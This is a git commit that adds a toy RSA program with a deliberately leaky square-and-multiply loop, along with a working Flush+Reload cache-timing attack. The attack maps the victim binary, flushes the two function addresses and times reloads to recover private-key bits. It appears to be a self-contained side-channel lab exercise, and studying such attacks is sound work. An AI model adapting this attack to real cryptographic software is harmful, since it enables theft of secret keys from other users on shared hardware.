f9e1cab1f5d5e70b0f7e1c0b96cfd26f1436c0e7
Adwiteeya R Paul <153979848+adwiteeya-r-paul@users.noreply.github.com>
2026-06-09 05:01:43 +0000

    rsa flush+reload

---
+++ attack_rsa.c
@@ -0,0 +1,79 @@
+#include <sys/stat.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <time.h>
+#include <errno.h>
+#include <string.h>
+#include <x86intrin.h>
+
+const int T_multiply = 0x1210;
+const int T_square = 0x11e7;
+int i = 0;
+int j = 0;
+
+
+static inline uint64_t rdtsc_begin(void) {
+    _mm_lfence();
+    return __rdtsc();
+}
+
+static inline uint64_t rdtsc_end(void) {
+    unsigned int aux;
+    uint64_t t = __rdtscp(&aux);
+    _mm_lfence();
+    return t;
+} 
+
+// mapping the victim executable
+int main (int argc, char *argv[]){
+    int rsa = open("./rsa", O_RDONLY);
+
+    // finding out the size
+    struct stat file;
+    stat("./rsa", &file);
+
+    void *map = mmap(NULL, file.st_size, PROT_READ, MAP_SHARED, rsa, 0);
+
+    char *square = (char *) map + T_square;
+    char *multiply = (char *) map + T_multiply;
+    uint64_t diff = 0;
+    uint64_t sum;
+
+    while(i<8) {
+        _mm_clflush(square);
+        _mm_clflush(multiply);
+   
+        for (volatile int i = 0; i < 100000; i++);
+        sum = 0;
+        j = 0;
+  
+            uint64_t t0 = rdtsc_begin();
+            volatile char v = *square;
+            uint64_t t1 = rdtsc_end();        
+            uint64_t time_square = t1-t0;
+
+
+            uint64_t t2 = rdtsc_begin();
+            volatile char v2 = *multiply;
+            uint64_t t3 = rdtsc_end();        
+            uint64_t time_multiply = t3-t2;
+        
+        printf("time_square: %lu, time_multiply: %lu\n", time_square, time_multiply);
+
+        if (time_multiply > 280) {
+            printf("bit %d is: %d\n", i, 0);
+        }
+        else {
+            printf("bit %d is: %d\n", i, 1);
+        } 
+    i ++;
+    }
+        
+}
+
---
+++ rsa.c
@@ -0,0 +1,88 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+const int P = 31;
+const int Q = 23;
+const int E = 19;
+const int PHI = (P - 1) * (Q - 1);
+
+
+// finding d which is coprime to phi and satisfies (E * D) % PHI == 1
+int find_d(){
+    int D = 1;
+    while ((E * D) % PHI != 1){
+        D++;
+    }
+    return D;
+}
+
+
+
+// binary function
+int binary(int message){
+    int num_of_bits = 0;
+    int cursor = message;
+    while (cursor > 1){
+        cursor = cursor>>1;
+        num_of_bits++;
+    }
+    return num_of_bits;
+}
+
+
+
+//square function
+__attribute__((aligned(128))) int square(int d){
+    d = (d*d) % (P*Q);
+    return d;
+}
+
+
+
+//multiply function
+__attribute__((aligned(128))) int multiply(int message, int horner){
+    int result = (message*horner)%(P*Q);
+    return result;
+}
+
+int horner_loop(int message, int d){
+
+    int num_of_bits = binary(d);
+    int horner = 1;
+
+    for (int i = num_of_bits; i >= 0; i--){
+        for (volatile int i = 0; i < 100000; i++);
+        horner = square(horner);
+        if ((d >> i) & 1){
+            horner = multiply(horner, message);
+        }
+
+    }
+    return horner;
+}
+
+
+// main function
+int main(int argc, char *argv[]){
+    /*
+    if (argc != 2){
+        printf("Wrong number of arguments.\n");
+        return 1;
+    }
+    */
+
+    
+    int message = 35;
+    int d = find_d();
+
+    
+    int encrypted_message = horner_loop(message, E);
+    printf("Encrypted message: %d\n", encrypted_message);
+
+
+    int decrypted_message = horner_loop(encrypted_message, d);
+    printf("Decrypted message: %d\n", decrypted_message);
+    
+}
+
